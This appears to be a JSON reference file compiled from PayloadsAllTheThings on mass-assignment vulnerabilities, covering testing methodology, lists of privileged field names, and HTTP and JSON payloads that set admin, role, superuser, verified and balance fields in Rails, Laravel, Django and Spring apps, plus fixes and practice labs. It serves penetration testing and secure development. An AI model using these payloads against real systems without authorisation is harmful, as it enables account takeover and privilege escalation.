@@ -1,0 +1,146 @@
+{
+  "category": "Mass Assignment",
+  "source": "PayloadsAllTheThings/Mass Assignment/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What Mass Assignment is",
+      "language": "text",
+      "tags": ["methodology", "mass-assignment"],
+      "body": "Mass Assignment (also known as Autobinding / Object Injection) - the application automatically transfers user input into the properties of a program object. The vulnerability arises when a user can set attributes they should not have access to: permissions, role, admin flag, balance.\n\nIt is most often found in ORM-based applications, where the object's properties are updated all at once from the request body rather than one by one. Such functionality is provided by popular frameworks: Ruby on Rails, Django, Laravel (PHP), Spring.\n\nExample: there is a user object with the attributes username, email, password, isAdmin. Normally, through a form the user changes only username, email and password. If the server does not check which fields are allowed to be updated, the attacker adds isAdmin to the request - and gains administrator privileges."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Where to look and how to test",
+      "language": "text",
+      "tags": ["methodology", "recon", "authz"],
+      "body": "• Any endpoints that create or update an object from the request body: registration, profile update, settings, creating an order/comment/post, import.\n• First capture a \"legitimate\" response - which fields the server returns for the object (id, role, isAdmin, verified, balance, owner_id, status). Try sending those same names back.\n• Sources of hidden field names: the GET response of the same object, documentation/Swagger/GraphQL introspection, frontend JS, leaked DB schemas, other roles (create an admin object and compare the fields).\n• Set up two accounts. Change your object, adding a privileged field -> re-read the object and check whether it was applied.\n• Test both create (POST) and update (PUT/PATCH): protection is often present on only one of them.\n• Change the body format: form-urlencoded <-> JSON <-> multipart <-> XML - the field filter may not work for all of them."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Typical privileged fields to try",
+      "language": "text",
+      "tags": ["methodology", "fields", "enumeration"],
+      "body": "Substitute these names (and their variants in snake_case / camelCase) alongside legitimate request fields:\n\n• Permissions/role:   isAdmin, is_admin, admin, role, roles, role_id, group, group_id, permissions, is_staff, is_superuser, access_level, user_type\n• Trust:               verified, is_verified, email_verified, confirmed, active, is_active, enabled, approved, status\n• Ownership:           user_id, owner, owner_id, account_id, organization_id, tenant_id, created_by\n• Money:               balance, credit, credits, points, price, discount, is_premium, subscription, plan\n• Other:               id, uuid, password (someone else's object), reset_token, api_key"
+    },
+    {
+      "subcategory": "Privileged fields (JSON)",
+      "title": "Adding isAdmin to a JSON body",
+      "language": "json",
+      "tags": ["mass-assignment", "json", "privilege-escalation"],
+      "body": "{\n    \"username\": \"attacker\",\n    \"email\": \"attacker@email.com\",\n    \"password\": \"unsafe_password\",\n    \"isAdmin\": true\n}"
+    },
+    {
+      "subcategory": "Privileged fields (JSON)",
+      "title": "Role elevation during a profile update",
+      "language": "http",
+      "tags": ["mass-assignment", "json", "privilege-escalation"],
+      "body": "PATCH /api/users/me HTTP/1.1\nHost: vulnerable\nContent-Type: application/json\n\n{\n    \"email\": \"attacker@email.com\",\n    \"role\": \"admin\"\n}"
+    },
+    {
+      "subcategory": "Privileged fields (JSON)",
+      "title": "Self-verification / account activation",
+      "language": "json",
+      "tags": ["mass-assignment", "json", "verified"],
+      "body": "{\n    \"email\": \"attacker@email.com\",\n    \"email_verified\": true,\n    \"is_active\": true,\n    \"status\": \"approved\"\n}"
+    },
+    {
+      "subcategory": "Privileged fields (form)",
+      "title": "The same fields in form-urlencoded",
+      "language": "http",
+      "tags": ["mass-assignment", "form", "privilege-escalation"],
+      "body": "POST /users HTTP/1.1\nHost: vulnerable\nContent-Type: application/x-www-form-urlencoded\n\nusername=attacker&email=attacker%40email.com&password=unsafe_password&isAdmin=true"
+    },
+    {
+      "subcategory": "Privileged fields (form)",
+      "title": "Nested objects via bracket notation",
+      "language": "http",
+      "tags": ["mass-assignment", "form", "nested"],
+      "body": "username=attacker&user[role]=admin&user[isAdmin]=true&account[balance]=999999"
+    },
+    {
+      "subcategory": "Hidden field enumeration",
+      "title": "Capture the object schema from the GET response",
+      "language": "http",
+      "tags": ["recon", "enumeration", "fields"],
+      "body": "# 1. Read your object - the field names in the response are candidates for injection\nGET /api/users/me HTTP/1.1\nHost: vulnerable\n\n# The response reveals hidden fields:\n# { \"id\": 17, \"username\": \"me\", \"role\": \"user\", \"isAdmin\": false, \"verified\": false }\n\n# 2. Send them back in an update request with the values you want\nPUT /api/users/me HTTP/1.1\nHost: vulnerable\nContent-Type: application/json\n\n{ \"role\": \"admin\", \"isAdmin\": true, \"verified\": true }"
+    },
+    {
+      "subcategory": "Hidden field enumeration",
+      "title": "Enumeration idea and sources of names",
+      "language": "text",
+      "tags": ["recon", "enumeration", "tips"],
+      "body": "You will not guess a hidden field name blindly - build a wordlist for the target:\n• The GET response of the same object (the most common source).\n• Swagger/OpenAPI, WSDL, GraphQL introspection, .map files and frontend JS.\n• Validation error responses sometimes list the expected/unknown fields.\n• Create an object under a different role (for example, through the admin panel of a demo stand) and compare the set of fields.\n• Brute-force common names with Intruder (role, is_admin, verified...) and watch whether the object changes after re-reading it."
+    },
+    {
+      "subcategory": "Ruby on Rails",
+      "title": "Rails - the essence and exploitation",
+      "language": "text",
+      "tags": ["rails", "ruby", "mass-assignment"],
+      "body": "Rails transfers the params hash straight into the model attributes (User.new(params[:user]), update(params[:user])). The protection is Strong Parameters: params.require(:user).permit(:email, :password). If the developer forgot permit or used permit!, any model field is assigned.\n\nExploitation: alongside the legitimate fields you add a model attribute or DB column - admin, role, account_id.\n\nHistorically (Rails < 4, attr_accessible) this flaw was used to gain commit access to GitHub repositories."
+    },
+    {
+      "subcategory": "Ruby on Rails",
+      "title": "Rails - payload with a nested user hash",
+      "language": "http",
+      "tags": ["rails", "ruby", "form"],
+      "body": "POST /users HTTP/1.1\nHost: vulnerable\nContent-Type: application/x-www-form-urlencoded\n\nuser[email]=attacker%40email.com&user[password]=Passw0rd!&user[admin]=true"
+    },
+    {
+      "subcategory": "Laravel (PHP)",
+      "title": "Laravel - the essence and exploitation",
+      "language": "text",
+      "tags": ["laravel", "php", "mass-assignment"],
+      "body": "Eloquent mass-assigns via create()/fill()/update(). The protection on the model is $fillable (allow-list) or $guarded (block-list). Dangerous configurations:\n• $guarded = []; - everything is allowed to be assigned.\n• A sensitive column (is_admin, role_id) ended up neither in $guarded nor outside $fillable.\n\nExploitation: you send the table column name as an ordinary form/JSON field - Eloquent writes it into the model."
+    },
+    {
+      "subcategory": "Laravel (PHP)",
+      "title": "Laravel - payload (column as an ordinary field)",
+      "language": "http",
+      "tags": ["laravel", "php", "form"],
+      "body": "POST /register HTTP/1.1\nHost: vulnerable\nContent-Type: application/x-www-form-urlencoded\n\nname=attacker&email=attacker%40email.com&password=secret&is_admin=1&role_id=1"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Django - the essence and exploitation",
+      "language": "text",
+      "tags": ["django", "python", "mass-assignment"],
+      "body": "In Django mass assignment comes through ModelForm and DRF serializers (ModelSerializer). It is dangerous when fields are defined too broadly:\n• fields = '__all__' in the form/serializer Meta - the set also includes is_staff, is_superuser, is_active.\n• There are no read_only_fields for sensitive columns.\n\nExploitation: you add to the JSON/form a model field that should not be editable."
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Django - payload (DRF, elevation to staff/superuser)",
+      "language": "json",
+      "tags": ["django", "python", "json"],
+      "body": "{\n    \"username\": \"attacker\",\n    \"email\": \"attacker@email.com\",\n    \"is_staff\": true,\n    \"is_superuser\": true,\n    \"is_active\": true\n}"
+    },
+    {
+      "subcategory": "Spring (Java)",
+      "title": "Spring MVC - the essence and exploitation",
+      "language": "text",
+      "tags": ["spring", "java", "mass-assignment"],
+      "body": "Spring MVC automatically binds request parameters into the fields of a command/DTO object (data binding). If the controller accepts the model entity directly and does not restrict the fields, the attacker sets any property, including privileged ones.\n\nRestrictions are set via @InitBinder with setAllowedFields()/setDisallowedFields(), a DTO without sensitive fields, or @JsonIgnore. Their absence = mass assignment.\n\nExploitation: you add the entity's field name as an ordinary request parameter."
+    },
+    {
+      "subcategory": "Spring (Java)",
+      "title": "Spring - payload (binding a privileged field)",
+      "language": "http",
+      "tags": ["spring", "java", "form"],
+      "body": "POST /account/update HTTP/1.1\nHost: vulnerable\nContent-Type: application/x-www-form-urlencoded\n\nusername=attacker&email=attacker%40email.com&role=ADMIN&enabled=true"
+    },
+    {
+      "subcategory": "Defense",
+      "title": "How to fix mass assignment",
+      "language": "text",
+      "tags": ["defense", "remediation"],
+      "body": "• Use an allow-list of fields permitted for binding, not a block-list: Rails permit, Laravel $fillable, DRF fields=[...] + read_only_fields, Spring setAllowedFields/DTO.\n• Never bind the request straight into the domain model - use a separate DTO/ViewModel with only the fields the user is allowed to change.\n• Set sensitive fields (role, flags, owner, balance) only through server-side logic, not from input.\n• Do not rely on hiding a field on the frontend - validate on the server.\n• Cover it with tests: an attempt to set a privileged field must be ignored or rejected."
+    },
+    {
+      "subcategory": "Labs",
+      "title": "Where to practice",
+      "language": "text",
+      "tags": ["labs", "practice"],
+      "body": "• PentesterAcademy - Mass Assignment I (attackdefense, cid=1964)\n• PentesterAcademy - Mass Assignment II (attackdefense, cid=1922)\n• Root Me - API - Mass Assignment (root-me.org, Web-Server)"
+    }
+  ]
+}
